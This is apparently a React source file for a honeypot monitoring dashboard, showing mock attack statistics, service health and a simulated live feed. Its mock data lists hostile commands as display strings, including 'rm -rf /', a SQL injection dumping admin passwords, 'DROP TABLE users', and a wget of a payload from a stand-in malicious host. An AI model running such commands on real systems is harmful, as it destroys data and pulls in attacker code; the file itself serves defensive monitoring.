"use client";

import { Sidebar } from "@/components/ui/sidebar";
import { Header } from "@/components/ui/header";
import { motion } from "framer-motion";
import {
  Shield,
  Activity,
  AlertTriangle,
  Users,
  Server,
  Terminal,
  Database,
  Zap,
  ArrowUpRight,
  Clock,
  TrendingUp,
  TrendingDown,
} from "lucide-react";
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
  CardAction,
} from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Progress } from "@/components/ui/progress";
import { ScrollArea } from "@/components/ui/scroll-area";
import { cn } from "@/lib/utils";

// Mock data for demonstration
const mockStats = {
  totalAttacks: 2847,
  activeSessions: 12,
  avgRiskScore: 67,
  blockedIPs: 156,
};

const mockRecentAttacks = [
  {
    id: "1",
    service: "ssh" as const,
    command: "rm -rf / --no-preserve-root",
    ip: "192.168.1.45",
    risk: "critical" as const,
    time: "2 min ago",
    mlScore: 0.94,
  },
  {
    id: "2",
    service: "mysql" as const,
    command: "SELECT * FROM users WHERE 1=1 UNION SELECT password FROM admin--",
    ip: "10.0.0.23",
    risk: "high" as const,
    time: "5 min ago",
    mlScore: 0.87,
  },
  {
    id: "3",
    service: "ftp" as const,
    command: "STOR malware.exe",
    ip: "172.16.0.89",
    risk: "high" as const,
    time: "8 min ago",
    mlScore: 0.82,
  },
  {
    id: "4",
    service: "ssh" as const,
    command: "wget http://malicious.com/payload.sh",
    ip: "192.168.2.101",
    risk: "medium" as const,
    time: "12 min ago",
    mlScore: 0.71,
  },
  {
    id: "5",
    service: "mysql" as const,
    command: "DROP TABLE users;",
    ip: "10.0.1.15",
    risk: "critical" as const,
    time: "15 min ago",
    mlScore: 0.96,
  },
];

const mockServiceStats = [
  { service: "SSH", sessions: 5, attacks: 847, icon: Terminal, color: "text-cyan-400" },
  { service: "FTP", sessions: 3, attacks: 523, icon: Database, color: "text-purple-400" },
  { service: "MySQL", sessions: 4, attacks: 1477, icon: Database, color: "text-amber-400" },
];

// Risk badge variant mapping
function getRiskBadgeVariant(risk: string) {
  const variants: Record<string, string> = {
    low: "bg-emerald-500/15 text-emerald-400 border-emerald-500/30",
    medium: "bg-amber-500/15 text-amber-400 border-amber-500/30",
    high: "bg-orange-500/15 text-orange-400 border-orange-500/30",
    critical: "bg-red-500/15 text-red-400 border-red-500/30 animate-pulse",
  };
  return variants[risk] || variants.low;
}

// Service badge styling
function getServiceBadgeClass(service: string) {
  const styles: Record<string, string> = {
    ssh: "bg-cyan-500/15 text-cyan-400 border-cyan-500/30",
    ftp: "bg-purple-500/15 text-purple-400 border-purple-500/30",
    mysql: "bg-amber-500/15 text-amber-400 border-amber-500/30",
  };
  return styles[service.toLowerCase()] || styles.ssh;
}

interface StatCardProps {
  title: string;
  value: string | number;
  change?: { value: number; trend: "up" | "down" };
  icon: React.ElementType;
  iconColor: string;
}

function StatCard({ title, value, change, icon: Icon, iconColor }: StatCardProps) {
  return (
    <motion.div
      initial={{ opacity: 0, y: 20 }}
      animate={{ opacity: 1, y: 0 }}
    >
      <Card className="border-border/50 bg-card/80 backdrop-blur-sm">
        <CardContent className="p-5">
          <div className="flex items-start justify-between">
            <div className="space-y-1">
              <p className="text-sm font-medium text-muted-foreground">{title}</p>
              <h3 className="text-2xl font-bold tracking-tight">{value}</h3>
              {change && (
                <div className={cn(
                  "flex items-center gap-1 text-sm",
                  change.trend === "up" ? "text-emerald-400" : "text-red-400"
                )}>
                  {change.trend === "up" ? (
                    <TrendingUp className="h-4 w-4" />
                  ) : (
                    <TrendingDown className="h-4 w-4" />
                  )}
                  <span className="font-medium">
                    {change.value > 0 ? "+" : ""}{change.value}%
                  </span>
                  <span className="text-muted-foreground">vs 24h</span>
                </div>
              )}
            </div>
            <div className={cn("flex h-11 w-11 items-center justify-center rounded-xl bg-muted", iconColor)}>
              <Icon className="h-5 w-5" />
            </div>
          </div>
        </CardContent>
      </Card>
    </motion.div>
  );
}

export default function Home() {
  return (
    <div className="min-h-screen bg-background" suppressHydrationWarning>
      {/* Animated gradient background */}
      <div className="gradient-bg" />

      <Sidebar />

      <div className="flex min-h-screen flex-col" style={{ marginLeft: 256 }}>
        <Header />

        <main className="flex-1 p-6">
          <div className="space-y-6">
            {/* Page Title */}
            <div className="flex items-center justify-between">
              <div>
                <h1 className="text-2xl font-bold">Security Overview</h1>
                <p className="text-sm text-muted-foreground">
                  Real-time threat monitoring across all honeypot services
                </p>
              </div>
              <div className="flex items-center gap-2">
                <div className="relative h-2.5 w-2.5">
                  <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-emerald-400 opacity-75" />
                  <span className="relative inline-flex h-2.5 w-2.5 rounded-full bg-emerald-500" />
                </div>
                <span className="text-sm font-medium text-muted-foreground">Live Updates</span>
              </div>
            </div>

            {/* Stats Grid - Using shadcn Card */}
            <div className="grid grid-cols-1 gap-4 sm:grid-cols-2 lg:grid-cols-4">
              <StatCard
                title="Total Attacks"
                value={mockStats.totalAttacks.toLocaleString()}
                change={{ value: 12.5, trend: "up" }}
                icon={Shield}
                iconColor="text-red-400"
              />
              <StatCard
                title="Active Sessions"
                value={mockStats.activeSessions}
                change={{ value: 3, trend: "up" }}
                icon={Activity}
                iconColor="text-emerald-400"
              />
              <StatCard
                title="Avg Risk Score"
                value={`${mockStats.avgRiskScore}/100`}
                change={{ value: 5.2, trend: "down" }}
                icon={AlertTriangle}
                iconColor="text-amber-400"
              />
              <StatCard
                title="Blocked IPs"
                value={mockStats.blockedIPs}
                change={{ value: 8.3, trend: "up" }}
                icon={Users}
                iconColor="text-purple-400"
              />
            </div>

            {/* Main Content Grid */}
            <div className="grid grid-cols-1 gap-6 lg:grid-cols-3">
              {/* Recent Attacks - Takes 2 columns */}
              <div className="lg:col-span-2">
                <Card className="border-border/50 bg-card/80 backdrop-blur-sm">
                  <CardHeader>
                    <CardTitle>Recent Attack Activity</CardTitle>
                    <CardDescription>Latest detected threats across all services</CardDescription>
                    <CardAction>
                      <Button variant="outline" size="sm">View All</Button>
                    </CardAction>
                  </CardHeader>
                  <CardContent>
                    <ScrollArea className="h-[400px] pr-4">
                      <div className="space-y-2">
                        {mockRecentAttacks.map((attack, index) => (
                          <motion.div
                            key={attack.id}
                            initial={{ opacity: 0, x: -20 }}
                            animate={{ opacity: 1, x: 0 }}
                            transition={{ delay: index * 0.05 }}
                            className={cn(
                              "group flex items-center gap-4 rounded-lg border border-transparent p-3 transition-all hover:border-border hover:bg-muted/50",
                              attack.risk === "critical" && "border-red-500/20 bg-red-500/5"
                            )}
                          >
                            {/* Service Badge */}
                            <Badge variant="outline" className={getServiceBadgeClass(attack.service)}>
                              {attack.service.toUpperCase()}
                            </Badge>

                            {/* Command */}
                            <div className="flex-1 overflow-hidden">
                              <p className="truncate font-mono text-sm">
                                {attack.command}
                              </p>
                              <div className="mt-1 flex items-center gap-3 text-xs text-muted-foreground">
                                <span className="flex items-center gap-1">
                                  <Server className="h-3 w-3" />
                                  {attack.ip}
                                </span>
                                <span className="flex items-center gap-1">
                                  <Clock className="h-3 w-3" />
                                  {attack.time}
                                </span>
                              </div>
                            </div>

                            {/* ML Score */}
                            <div className="text-right">
                              <div className="text-sm font-semibold">
                                {(attack.mlScore * 100).toFixed(0)}%
                              </div>
                              <div className="text-xs text-muted-foreground">ML Score</div>
                            </div>

                            {/* Risk Badge */}
                            <Badge variant="outline" className={getRiskBadgeVariant(attack.risk)}>
                              {attack.risk.toUpperCase()}
                            </Badge>

                            {/* Action */}
                            <Button
                              variant="ghost"
                              size="icon"
                              className="opacity-0 transition-opacity group-hover:opacity-100"
                            >
                              <ArrowUpRight className="h-4 w-4" />
                            </Button>
                          </motion.div>
                        ))}
                      </div>
                    </ScrollArea>
                  </CardContent>
                </Card>
              </div>

              {/* Service Status - Takes 1 column */}
              <div className="space-y-6">
                {/* Active Services */}
                <Card className="border-border/50 bg-card/80 backdrop-blur-sm">
                  <CardHeader>
                    <CardTitle>Service Status</CardTitle>
                    <CardDescription>Honeypot services health</CardDescription>
                  </CardHeader>
                  <CardContent>
                    <div className="space-y-5">
                      {mockServiceStats.map((service) => {
                        const Icon = service.icon;
                        const percentage = Math.round((service.attacks / 2000) * 100);
                        return (
                          <div key={service.service} className="space-y-2">
                            <div className="flex items-center justify-between">
                              <div className="flex items-center gap-2">
                                <Icon className={cn("h-4 w-4", service.color)} />
                                <span className="font-medium">{service.service}</span>
                              </div>
                              <div className="flex items-center gap-2">
                                <span className="text-sm text-muted-foreground">
                                  {service.sessions} sessions
                                </span>
                                <div className="h-2 w-2 rounded-full bg-emerald-500" />
                              </div>
                            </div>
                            <Progress
                              value={percentage}
                              className={cn(
                                "h-2",
                                percentage > 70 && "[&>div]:bg-red-500",
                                percentage > 40 && percentage <= 70 && "[&>div]:bg-amber-500"
                              )}
                            />
                            <div className="text-xs text-muted-foreground">
                              {service.attacks.toLocaleString()} attacks detected
                            </div>
                          </div>
                        );
                      })}
                    </div>
                  </CardContent>
                </Card>

                {/* Quick Actions */}
                <Card className="border-border/50 bg-card/80 backdrop-blur-sm">
                  <CardHeader>
                    <CardTitle>Quick Actions</CardTitle>
                  </CardHeader>
                  <CardContent>
                    <div className="grid grid-cols-2 gap-2">
                      <Button variant="outline" className="flex items-center justify-center gap-2">
                        <Zap className="h-4 w-4" />
                        <span>Report</span>
                      </Button>
                      <Button variant="outline" className="flex items-center justify-center gap-2">
                        <Shield className="h-4 w-4" />
                        <span>Block IP</span>
                      </Button>
                      <Button variant="outline" className="col-span-2 flex items-center justify-center gap-2">
                        <Activity className="h-4 w-4" />
                        <span>View ML Insights</span>
                      </Button>
                    </div>
                  </CardContent>
                </Card>
              </div>
            </div>

            {/* Terminal Preview */}
            <Card className="overflow-hidden border-border/50 bg-card/80 p-0 backdrop-blur-sm">
              <div className="flex items-center gap-2 border-b border-border bg-muted/30 px-4 py-3">
                <div className="h-3 w-3 rounded-full bg-red-500" />
                <div className="h-3 w-3 rounded-full bg-amber-500" />
                <div className="h-3 w-3 rounded-full bg-emerald-500" />
                <span className="ml-3 text-sm text-muted-foreground">Live Attack Feed</span>
                <div className="ml-auto flex items-center gap-2">
                  <div className="relative h-2 w-2">
                    <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-emerald-400 opacity-75" />
                    <span className="relative inline-flex h-2 w-2 rounded-full bg-emerald-500" />
                  </div>
                </div>
              </div>
              <div className="max-h-48 overflow-y-auto p-4 font-mono text-sm">
                <div className="space-y-1">
                  <div className="flex gap-2">
                    <span className="text-muted-foreground">[00:41:15]</span>
                    <span className="text-cyan-400">[SSH]</span>
                    <span className="text-emerald-400">192.168.1.45</span>
                    <span>Connected - Starting session</span>
                  </div>
                  <div className="flex gap-2">
                    <span className="text-muted-foreground">[00:41:18]</span>
                    <span className="text-cyan-400">[SSH]</span>
                    <span className="text-emerald-400">192.168.1.45</span>
                    <span>Command: <span className="text-amber-400">ls -la /etc/passwd</span></span>
                  </div>
                  <div className="flex gap-2">
                    <span className="text-muted-foreground">[00:41:22]</span>
                    <span className="text-purple-400">[FTP]</span>
                    <span className="text-emerald-400">10.0.0.23</span>
                    <span>STOR attempt: <span className="text-red-400">malware.exe</span></span>
                  </div>
                  <div className="flex gap-2">
                    <span className="text-muted-foreground">[00:41:25]</span>
                    <span className="text-amber-400">[MySQL]</span>
                    <span className="text-emerald-400">172.16.0.89</span>
                    <span>Query: <span className="text-red-400">SELECT * FROM users WHERE 1=1--</span></span>
                  </div>
                  <div className="flex gap-2">
                    <span className="text-muted-foreground">[00:41:28]</span>
                    <span className="text-cyan-400">[SSH]</span>
                    <span className="text-emerald-400">192.168.1.45</span>
                    <span>⚠️ <span className="text-red-400">CRITICAL:</span> rm -rf / attempted</span>
                  </div>
                </div>
              </div>
            </Card>
          </div>
        </main>
      </div>
    </div>
  );
}
